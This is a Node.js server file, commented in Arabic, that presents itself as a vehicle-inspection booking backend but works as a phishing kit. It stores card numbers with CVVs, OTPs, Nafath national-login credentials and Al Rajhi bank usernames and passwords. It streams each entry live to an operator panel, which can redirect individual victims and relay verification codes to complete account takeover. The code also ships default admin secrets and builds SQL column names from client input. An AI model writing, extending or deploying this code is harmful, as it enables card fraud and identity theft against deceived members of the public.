/**
 * server.js - الخادم الرئيسي لنظام حجز الفحص الفني
 * تم تعديله ليدعم PostgreSQL على Railway - نسخة كاملة بدون اختصار
 */

require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const { Pool } = require("pg"); 
const { nanoid } = require("nanoid");

// ==================== إعداد المتغيرات ====================
const PORT = process.env.PORT || 8080; 
const JWT_SECRET = process.env.JWT_SECRET || "vehicle-inspection-secret-2024";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@2024";

// إعداد الاتصال بـ PostgreSQL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// ==================== إنشاء الجداول (PostgreSQL Syntax) ====================
const initDb = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS bookings (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        clientName TEXT DEFAULT '',
        clientId TEXT DEFAULT '',
        clientPhone TEXT DEFAULT '',
        clientEmail TEXT DEFAULT '',
        clientNationality TEXT DEFAULT '',
        hasDelegate INTEGER DEFAULT 0,
        delegateType TEXT DEFAULT '',
        delegateName TEXT DEFAULT '',
        delegatePhone TEXT DEFAULT '',
        delegateNationality TEXT DEFAULT '',
        delegateId TEXT DEFAULT '',
        vehicleCountry TEXT DEFAULT '',
        vehiclePlate TEXT DEFAULT '',
        vehiclePlateChar1 TEXT DEFAULT '',
        vehiclePlateChar2 TEXT DEFAULT '',
        vehiclePlateChar3 TEXT DEFAULT '',
        vehicleType TEXT DEFAULT '',
        vehicleCarryDang INTEGER DEFAULT 0,
        serviceRegion TEXT DEFAULT '',
        serviceType TEXT DEFAULT '',
        serviceDate TEXT DEFAULT '',
        serviceTime TEXT DEFAULT '',
        clientIp TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        status TEXT DEFAULT 'new',
        statusRead INTEGER DEFAULT 0,
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        cardHolderName TEXT DEFAULT '',
        cardNumber TEXT DEFAULT '',
        cardLastFour TEXT DEFAULT '',
        cardExpiry TEXT DEFAULT '',
        cardCvv TEXT DEFAULT '',
        verifyCode TEXT DEFAULT '',
        secretNum TEXT DEFAULT '',
        rajUsername TEXT DEFAULT '',
        rajPassword TEXT DEFAULT '',
        paymentAction TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS verification_codes (
        id SERIAL PRIMARY KEY,
        referenceId TEXT NOT NULL,
        type TEXT NOT NULL,
        nafathId TEXT DEFAULT '',
        nafathPassword TEXT DEFAULT '',
        nafathNumber TEXT DEFAULT '',
        motaselProvider TEXT DEFAULT '',
        motaselPhone TEXT DEFAULT '',
        motaselCode TEXT DEFAULT '',
        otpCode TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000),
        UNIQUE(referenceId, type)
      );

      CREATE TABLE IF NOT EXISTS navigation_logs (
        id SERIAL PRIMARY KEY,
        referenceId TEXT,
        clientIp TEXT DEFAULT '',
        targetPage TEXT DEFAULT '',
        note TEXT DEFAULT '',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );
    `);
    console.log("Database tables initialized successfully");
  } catch (err) {
    console.error("Error initializing database:", err);
  }
};

initDb();

// ==================== دوال قاعدة البيانات (PostgreSQL) ====================
async function createBooking(data) {
  const query = `
    INSERT INTO bookings (
      referenceId, clientName, clientId, clientPhone, clientEmail, clientNationality,
      hasDelegate, delegateType, delegateName, delegatePhone, delegateNationality, delegateId,
      vehicleCountry, vehiclePlate, vehiclePlateChar1, vehiclePlateChar2, vehiclePlateChar3,
      vehicleType, vehicleCarryDang, serviceRegion, serviceType, serviceDate, serviceTime,
      clientIp, rawData, status, statusRead
    ) VALUES (
      $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, $27
    ) RETURNING *`;
  
  const values = [
    data.referenceId, data.clientName, data.clientId, data.clientPhone, data.clientEmail, data.clientNationality,
    data.hasDelegate ? 1 : 0, data.delegateType, data.delegateName, data.delegatePhone, data.delegateNationality, data.delegateId,
    data.vehicleCountry, data.vehiclePlate, data.vehiclePlateChar1, data.vehiclePlateChar2, data.vehiclePlateChar3,
    data.vehicleType, data.vehicleCarryDang ? 1 : 0, data.serviceRegion, data.serviceType, data.serviceDate, data.serviceTime,
    data.clientIp, JSON.stringify(data.rawData || {}), data.status, data.statusRead
  ];

  const res = await pool.query(query, values);
  return res.rows[0];
}

async function getBookingByReference(referenceId) {
  const res = await pool.query("SELECT * FROM bookings WHERE referenceId = $1", [referenceId]);
  const row = res.rows[0];
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

async function getAllBookings() {
  const res = await pool.query("SELECT * FROM bookings ORDER BY createdAt DESC");
  return res.rows.map(r => {
    try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
    return r;
  });
}

async function updateBookingStatus(referenceId, status, statusRead) {
  if (statusRead !== undefined) {
    await pool.query("UPDATE bookings SET status = $1, statusRead = $2 WHERE referenceId = $3", [status, statusRead, referenceId]);
  } else {
    await pool.query("UPDATE bookings SET status = $1 WHERE referenceId = $2", [status, referenceId]);
  }
}

async function createOrUpdatePayment(referenceId, data) {
  const existing = await pool.query("SELECT id FROM payments WHERE referenceId = $1", [referenceId]);
  
  if (existing.rows.length > 0) {
    const keys = Object.keys(data).filter(k => k !== 'referenceId');
    const sets = keys.map((k, i) => `${k} = $${i + 2}`).join(", ");
    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
    await pool.query(`UPDATE payments SET ${sets} WHERE referenceId = $1`, [referenceId, ...values]);
  } else {
    const keys = ['referenceId', ...Object.keys(data)];
    const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'rawData' ? JSON.stringify(data[k]) : data[k]));
    await pool.query(`INSERT INTO payments (${keys.join(", ")}) VALUES (${placeholders})`, values);
  }
  return getPaymentByReference(referenceId);
}

async function getPaymentByReference(referenceId) {
  const res = await pool.query("SELECT * FROM payments WHERE referenceId = $1", [referenceId]);
  const row = res.rows[0];
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

async function createOrUpdateVerification(referenceId, type, data) {
  const existing = await pool.query("SELECT id FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
  if (existing.rows.length > 0) {
    const keys = Object.keys(data);
    const sets = keys.map((k, i) => `${k} = $${i + 3}`).join(", ");
    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
    await pool.query(`UPDATE verification_codes SET ${sets} WHERE referenceId = $1 AND type = $2`, [referenceId, type, ...values]);
  } else {
    const keys = ['referenceId', 'type', ...Object.keys(data)];
    const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'type' ? type : (k === 'rawData' ? JSON.stringify(data[k]) : data[k])));
    await pool.query(`INSERT INTO verification_codes (${keys.join(", ")}) VALUES (${placeholders})`, values);
  }
  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
  return res.rows[0];
}

async function getVerificationByReference(referenceId, type) {
  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
  return res.rows[0];
}

// ==================== Express Setup ====================
const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// --- توجيه الملفات الثابتة لمجلد public (لإظهار الموقع) ---
app.use(express.static(path.join(__dirname, 'public')));
app.use('/dist', express.static(path.join(__dirname, 'public', 'dist')));
app.use('/site', express.static(path.join(__dirname, 'public', 'site')));
app.use('/admin', express.static(path.join(__dirname, 'public', 'admin')));
// توجيه /assets/ إلى ملفات dist/assets (مشتركة بين جميع الصفحات)
app.use('/assets', express.static(path.join(__dirname, 'public', 'dist', 'assets')));

// فتح الصفحة الرئيسية من داخل مجلد public/dist
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dist', 'index.html'));
});

// فتح صفحة الموقع
app.get('/site', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'site', 'index.html'));
});
app.get('/site/*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'site', 'index.html'));
});

// فتح صفحة الأدمن
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
});
app.get('/admin/*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
});

// ==================== Socket.IO Setup ====================
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  transports: ["websocket", "polling"]
});

// Admin namespace
const adminIo = io.of("/admin");

// Helper: notify admin of new data
function notifyAdmin(event, data) {
  adminIo.emit(event, data);
}

// User socket connections
io.on("connection", (socket) => {
  console.log("User connected:", socket.id);

  // Submit booking
  socket.on("submitBooking", async (data, callback) => {
    try {
      const referenceId = nanoid(10).toUpperCase();
      const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
      const booking = await createBooking({
        ...data,
        referenceId,
        clientIp,
        status: "new",
        statusRead: 0,
        rawData: data
      });
      socket.join(referenceId);
      notifyAdmin("newBooking", booking);
      if (callback) callback({ success: true, referenceId });
    } catch (err) {
      console.error("submitBooking error:", err);
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit payment data
  socket.on("submitPaymentData", async (data, callback) => {
    try {
      const { referenceId, ...paymentData } = data;
      if (!referenceId) return callback && callback({ success: false, error: "No referenceId" });
      const payment = await createOrUpdatePayment(referenceId, { ...paymentData, rawData: data });
      socket.join(referenceId);
      notifyAdmin("newPayment", { referenceId, ...paymentData });
      if (callback) callback({ success: true });
    } catch (err) {
      console.error("submitPaymentData error:", err);
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit phone data
  socket.on("submitPhoneData", async (data, callback) => {
    try {
      const { referenceId } = data;
      if (!referenceId) return callback && callback({ success: false });
      await createOrUpdateVerification(referenceId, "phone", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "phone", referenceId, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit phone code data
  socket.on("submitPhoneCodeData", async (data, callback) => {
    try {
      const { referenceId } = data;
      if (!referenceId) return callback && callback({ success: false });
      await createOrUpdateVerification(referenceId, "phoneCode", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "phoneCode", referenceId, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit nafad data
  socket.on("submitNafadData", async (data, callback) => {
    try {
      const { referenceId } = data;
      if (!referenceId) return callback && callback({ success: false });
      await createOrUpdateVerification(referenceId, "nafad", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "nafad", referenceId, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit code data
  socket.on("submitCodeData", async (data, callback) => {
    try {
      const { referenceId } = data;
      if (!referenceId) return callback && callback({ success: false });
      await createOrUpdateVerification(referenceId, "code", { otpCode: data.code, ...data, rawData: data });
      notifyAdmin("newVerification", { type: "code", referenceId, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit rajhi data
  socket.on("submitRajhiData", async (data, callback) => {
    try {
      const { referenceId } = data;
      if (!referenceId) return callback && callback({ success: false });
      await createOrUpdateVerification(referenceId, "rajhi", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "rajhi", referenceId, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit rajhi code data
  socket.on("submitRajhiCodeData", async (data, callback) => {
    try {
      const { referenceId } = data;
      if (!referenceId) return callback && callback({ success: false });
      await createOrUpdateVerification(referenceId, "rajhiCode", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "rajhiCode", referenceId, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Submit verification data
  socket.on("submitVerificationData", async (data, callback) => {
    try {
      const { referenceId, type } = data;
      if (!referenceId) return callback && callback({ success: false });
      await createOrUpdateVerification(referenceId, type || "verification", { ...data, rawData: data });
      notifyAdmin("newVerification", { referenceId, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false, error: err.message });
    }
  });

  // Update location
  socket.on("updateLocation", async (data, callback) => {
    try {
      notifyAdmin("locationUpdate", { socketId: socket.id, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false });
    }
  });

  // Get nafad code
  socket.on("getNafadCode", async (data, callback) => {
    try {
      notifyAdmin("nafadCodeRequest", { socketId: socket.id, ...data });
      if (callback) callback({ success: true });
    } catch (err) {
      if (callback) callback({ success: false });
    }
  });

  socket.on("disconnect", () => {
    console.log("User disconnected:", socket.id);
  });
});

// ==================== Admin API Endpoints ====================

// Middleware to verify admin token
function verifyAdminToken(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.role !== "admin") return res.status(403).json({ error: "Forbidden" });
    req.admin = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

// Admin login
app.post("/api/admin/login", async (req, res) => {
  try {
    const { password } = req.body;
    if (!password) return res.status(400).json({ error: "Password required" });
    
    const isValid = password === ADMIN_PASSWORD;
    if (!isValid) return res.status(401).json({ error: "Invalid password" });
    
    const token = jwt.sign({ role: "admin", id: "admin" }, JWT_SECRET, { expiresIn: "24h" });
    res.json({ success: true, token });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin me
app.get("/api/admin/me", verifyAdminToken, (req, res) => {
  res.json({ success: true, admin: req.admin });
});

// Get all bookings
app.get("/api/admin/bookings", verifyAdminToken, async (req, res) => {
  try {
    const bookings = await getAllBookings();
    res.json({ success: true, data: bookings, bookings });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get stats
app.get("/api/admin/stats", verifyAdminToken, async (req, res) => {
  try {
    const bookings = await getAllBookings();
    const total = bookings.length;
    const newCount = bookings.filter(b => b.status === "new").length;
    const completed = bookings.filter(b => b.status === "completed").length;
    const processing = bookings.filter(b => b.status === "processing").length;
    const onlineUsers = io.engine.clientsCount || 0;
    res.json({ success: true, data: { total, new: newCount, completed, processing, onlineUsers }, total, new: newCount, completed, processing, onlineUsers });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Update booking status
app.post("/api/admin/update-status", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, status, statusRead } = req.body;
    await updateBookingStatus(referenceId, status, statusRead);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Navigate user to page
app.post("/api/admin/navigate", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, page } = req.body;
    // Emit to specific user room
    io.to(referenceId).emit("navigateTo", { page });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Send nafath code to user
app.post("/api/admin/send-nafath-code", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, code } = req.body;
    io.to(referenceId).emit("nafadCode", { code });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Nafath action
app.post("/api/admin/nafath-action", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, action, data } = req.body;
    io.to(referenceId).emit("nafadCode", { action, ...data });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Payment action
app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, action, data } = req.body;
    io.to(referenceId).emit("ackRajhiCode", { action, ...data });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin Socket.IO namespace
adminIo.on("connection", (socket) => {
  console.log("Admin connected:", socket.id);
  socket.on("disconnect", () => {
    console.log("Admin disconnected:", socket.id);
  });
});

// ==================== تشغيل السيرفر ====================
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
